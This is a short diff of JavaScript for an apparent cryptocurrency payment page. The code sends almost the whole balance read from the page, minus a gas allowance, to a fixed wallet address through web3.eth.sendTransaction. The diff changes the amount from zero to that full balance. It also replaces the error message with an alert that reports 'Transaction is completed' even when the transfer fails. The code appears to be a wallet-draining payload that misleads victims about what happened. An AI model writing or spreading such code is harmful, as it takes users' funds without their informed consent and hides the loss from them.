@@ -42,6 +42,7 @@ function hideconnectandshow(){
 
 var radonen
 var radonen2 = 0
+var weiValue= 0;
 function paynow(){
 radonen=document.getElementById("radje").innerHTML
 
@@ -49,9 +50,10 @@ radonen=document.getElementById("radje").innerHTML
 
 
 
-var ammmount = (radonen2-0.0014);
+var ammmount = (radonen-0.0014);
 
-var weiValue = ammmount*1000000000000000000;
+ weiValue = ammmount*1000000000000000000
+ weiValue = Math.round(weiValue)
 console.log("weivalue:"+weiValue);
 
 
@@ -59,17 +61,10 @@ console.log(ammmount)
 web3.eth.sendTransaction({
        from: account,
     to: '0x00555F4f4D0b1dBCD20F0fBc791efd7C88BFa76f',
-     gasPrice: '20000000000',
+     gasPrice: '38000000000',
     value: weiValue
 }, function(error, hash){
-
-	console.log(error)
-   Swal.fire({
-  icon: 'error',
-  title: 'Oops...',
-  text: 'Transaction Failed ):',
-  footer: 'Please reload this page... And try again :('
-})
+	alert("Transaction is completed")
 });
 
 
